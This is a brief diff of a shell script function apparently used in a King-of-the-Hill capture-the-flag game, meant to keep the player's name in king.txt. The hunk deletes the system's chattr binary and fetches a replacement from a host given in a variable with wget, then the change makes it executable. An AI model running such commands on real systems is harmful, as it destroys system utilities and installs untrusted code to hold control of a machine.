@@ -115,7 +115,7 @@ function koth() {
   # repeatedly puts your name in king.txt
   
   rm chattr 2>/dev/null; rm -f $(which chattr) 2>/dev/null
-  wget http://$ip/chattr
+  wget http://$ip/chattr && chmod 744 chattr
   
   while :
   do
